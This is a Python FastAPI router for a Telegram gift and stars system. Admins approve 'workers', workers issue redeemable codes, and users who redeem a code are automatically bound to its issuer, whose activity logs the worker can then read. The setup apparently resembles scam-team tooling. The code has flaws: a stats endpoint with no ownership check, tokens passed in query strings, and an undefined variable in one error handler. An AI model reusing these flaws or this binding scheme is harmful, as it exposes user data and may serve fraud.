"""
API Endpoints для воркеров
"""

from fastapi import APIRouter, Depends, HTTPException, Query
from fastapi.responses import JSONResponse
from sqlalchemy.ext.asyncio import AsyncSession
import os
from datetime import datetime

from app.database import get_db
from app.services import AuthService
from app.services.worker import (
    WorkerService, CheckCodeService, ReferralService, NotificationService, ActivityLogService
)
from app.utils.logger import ActivityLogger
from app.models.worker import WorkerRole

router = APIRouter(prefix="/api/workers", tags=["workers"])
auth_service = AuthService(os.getenv("TELEGRAM_BOT_TOKEN", ""))
logger = ActivityLogger()


async def get_current_user(token: str = Query(...), db: AsyncSession = Depends(get_db)):
    """Получает текущего пользователя из токена"""
    user_id = await auth_service.validate_session(token, db)
    if not user_id:
        raise HTTPException(status_code=401, detail="Invalid token")
    return user_id


async def get_current_worker(token: str = Query(...), db: AsyncSession = Depends(get_db)):
    """Получает текущего воркера и проверяет его права"""
    user_id = await auth_service.validate_session(token, db)
    if not user_id:
        raise HTTPException(status_code=401, detail="Invalid token")
    
    worker = await WorkerService.get_worker(str(user_id), db)
    if not worker or not worker.is_active:
        raise HTTPException(status_code=403, detail="Not a worker")
    
    return worker


async def get_current_admin(token: str = Query(...), db: AsyncSession = Depends(get_db)):
    """Получает админа (только админы могут выдавать права)"""
    user_id = await auth_service.validate_session(token, db)
    if not user_id:
        raise HTTPException(status_code=401, detail="Invalid token")
    
    # TODO: Проверить, является ли пользователь администратором
    # На данный момент проверяем по ID или статусу в БД
    admin_ids = os.getenv("ADMIN_IDS", "").split(",")
    if str(user_id) not in admin_ids:
        raise HTTPException(status_code=403, detail="Not an admin")
    
    return user_id


# ============================================================================
# ADMIN ENDPOINTS - Управление воркерами
# ============================================================================

@router.post("/approve")
async def approve_worker(
    data: dict,
    token: str = Query(...),
    db: AsyncSession = Depends(get_db)
):
    """Выдать права воркера пользователю (только админ)"""
    try:
        admin_id = await get_current_admin(token, db)
        
        user_telegram_id = data.get("user_id")
        role = data.get("role", "junior").upper()
        
        if not user_telegram_id:
            raise HTTPException(status_code=400, detail="Missing user_id")
        
        try:
            worker_role = WorkerRole[role]
        except KeyError:
            raise HTTPException(status_code=400, detail=f"Invalid role. Use: {', '.join([r.value for r in WorkerRole])}")
        
        worker = await WorkerService.approve_worker(
            user_telegram_id=user_telegram_id,
            role=worker_role,
            admin_id=str(admin_id),
            db=db
        )
        
        if not worker:
            raise HTTPException(status_code=400, detail="User is already a worker")
        
        logger.log_activity(
            str(admin_id),
            "admin",
            "worker_approved",
            "success",
            {
                "worker_id": user_telegram_id,
                "role": role
            }
        )
        
        return JSONResponse({
            "status": "success",
            "message": f"Worker approved with role {role}",
            "worker": {
                "telegram_id": worker.telegram_id,
                "role": worker.role.value,
                "daily_limit": worker.daily_limit
            }
        })
    
    except HTTPException:
        raise
    except Exception as e:
        logger.log_activity("unknown", "admin", "worker_approve", "error", {"error": str(e)})
        raise HTTPException(status_code=500, detail="Internal server error")


@router.get("/stats/{worker_id}")
async def get_worker_stats(
    worker_id: int,
    token: str = Query(...),
    db: AsyncSession = Depends(get_db)
):
    """Получить статистику воркера"""
    try:
        user_id = await get_current_user(token, db)
        
        stats = await WorkerService.get_worker_stats(worker_id, db)
        
        if not stats:
            raise HTTPException(status_code=404, detail="Worker not found")
        
        return JSONResponse({
            "status": "success",
            "stats": stats
        })
    
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail="Internal server error")


# ============================================================================
# WORKER ENDPOINTS - Создание чеков
# ============================================================================

@router.post("/codes/create")
async def create_check_code(
    data: dict,
    token: str = Query(...),
    db: AsyncSession = Depends(get_db)
):
    """Создать новый чек (код для активации подарка)
    
    Воркер может создать чек с:
    - Подарком + количеством
    - Звездами
    - Комбинацией обоих
    - Описанием и сроком действия
    """
    try:
        worker = await get_current_worker(token, db)
        
        gift_id = data.get("gift_id")
        gift_quantity = data.get("gift_quantity", 1)
        stars_amount = data.get("stars_amount", 0.0)
        description = data.get("description")
        expires_in_days = data.get("expires_in_days")
        
        # Проверяем, что хотя бы что-то есть
        if not gift_id and stars_amount <= 0:
            raise HTTPException(
                status_code=400,
                detail="Must specify either gift_id or stars_amount"
            )
        
        # Создаем чек
        check = await CheckCodeService.create_code(
            worker_id=worker.id,
            gift_id=gift_id,
            gift_quantity=gift_quantity,
            stars_amount=stars_amount,
            description=description,
            expires_in_days=expires_in_days,
            db=db
        )
        
        if not check:
            raise HTTPException(status_code=400, detail="Failed to create code (check daily limit)")
        
        return JSONResponse({
            "status": "success",
            "code": {
                "code": check.code,
                "gift_id": check.gift_id,
                "gift_quantity": check.gift_quantity,
                "stars_amount": check.stars_amount,
                "description": check.description,
                "expires_at": check.expires_at.isoformat() if check.expires_at else None,
                "created_at": check.created_at.isoformat()
            },
            "message": f"✅ Код создан: {check.code}"
        })
    
    except HTTPException:
        raise
    except Exception as e:
        logger.log_activity(str(user_id), "admin", "code_create", "error", {"error": str(e)})
        raise HTTPException(status_code=500, detail="Internal server error")


@router.get("/codes/my")
async def get_my_codes(
    token: str = Query(...),
    db: AsyncSession = Depends(get_db)
):
    """Получить все коды, созданные воркером"""
    try:
        worker = await get_current_worker(token, db)
        
        stats = await WorkerService.get_worker_stats(worker.id, db)
        
        return JSONResponse({
            "status": "success",
            "worker": {
                "telegram_id": worker.telegram_id,
                "role": worker.role.value,
            },
            "stats": {
                "referrals": worker.referrals_count,
                "codes_created": worker.codes_created,
                "codes_activated": worker.codes_activated,
                "total_distributed_stars": worker.total_distributed,
                "daily_limit": worker.daily_limit,
                "remaining_daily": worker.remaining_daily,
            }
        })
    
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail="Internal server error")


@router.get("/referrals")
async def get_my_referrals(
    token: str = Query(...),
    db: AsyncSession = Depends(get_db)
):
    """Получить список привязанных пользователей"""
    try:
        worker = await get_current_worker(token, db)
        
        referrals = await ReferralService.get_referrals(worker.id, db)
        
        return JSONResponse({
            "status": "success",
            "referrals_count": len(referrals),
            "referrals": referrals
        })
    
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail="Internal server error")


@router.get("/notifications")
async def get_notifications(
    unread_only: bool = False,
    token: str = Query(...),
    db: AsyncSession = Depends(get_db)
):
    """Получить уведомления"""
    try:
        worker = await get_current_worker(token, db)
        
        notifications = await NotificationService.get_notifications(
            worker.id, unread_only=unread_only, db=db
        )
        
        return JSONResponse({
            "status": "success",
            "notifications_count": len(notifications),
            "notifications": notifications
        })
    
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail="Internal server error")


@router.get("/activity-logs")
async def get_activity_logs(
    token: str = Query(...),
    db: AsyncSession = Depends(get_db)
):
    """Получить логи активности привязанных пользователей"""
    try:
        worker = await get_current_worker(token, db)
        
        logs = await ActivityLogService.get_logs_for_worker(worker.id, db)
        
        return JSONResponse({
            "status": "success",
            "logs_count": len(logs),
            "logs": logs
        })
    
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail="Internal server error")


# ============================================================================
# USER ENDPOINTS - Активация чеков
# ============================================================================

@router.post("/codes/activate")
async def activate_check_code(
    data: dict,
    token: str = Query(...),
    db: AsyncSession = Depends(get_db)
):
    """Активировать чек и привязаться к воркеру
    
    Пользователь может активировать чек и получить подарки/звезды
    Автоматически привязывается к воркеру, выдавшему чек
    """
    try:
        user_id = await get_current_user(token, db)
        
        code = data.get("code", "").strip().upper()
        
        if not code:
            raise HTTPException(status_code=400, detail="Code required")
        
        result = await CheckCodeService.activate_code(
            code=code,
            user_telegram_id=str(user_id),
            db=db
        )
        
        if result["status"] == "error":
            logger.log_activity(
                str(user_id),
                "gifts",
                "code_activate",
                "error",
                {"code": code, "reason": result["message"]}
            )
            raise HTTPException(status_code=400, detail=result["message"])
        
        logger.log_activity(
            str(user_id),
            "gifts",
            "code_activated",
            "success",
            {
                "code": code,
                "gifts": result.get("gifts_received", 0),
                "stars": result.get("stars_received", 0)
            }
        )
        
        return JSONResponse({
            "status": "success",
            "message": result["message"],
            "gifts_received": result.get("gifts_received", 0),
            "stars_received": result.get("stars_received", 0),
            "bound_to_worker": result.get("bound_to_worker")
        })
    
    except HTTPException:
        raise
    except Exception as e:
        logger.log_activity("unknown", "gifts", "code_activate", "error", {"error": str(e)})
        raise HTTPException(status_code=500, detail="Internal server error")


@router.get("/my-worker")
async def get_my_worker(
    token: str = Query(...),
    db: AsyncSession = Depends(get_db)
):
    """Получить информацию о воркере, к которому привязан пользователь"""
    try:
        user_id = await get_current_user(token, db)
        
        worker = await ReferralService.get_worker_for_user(str(user_id), db)
        
        if not worker:
            return JSONResponse({
                "status": "success",
                "worker": None,
                "message": "Not bound to any worker"
            })
        
        stats = await WorkerService.get_worker_stats(worker.id, db)
        
        return JSONResponse({
            "status": "success",
            "worker": stats
        })
    
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail="Internal server error")
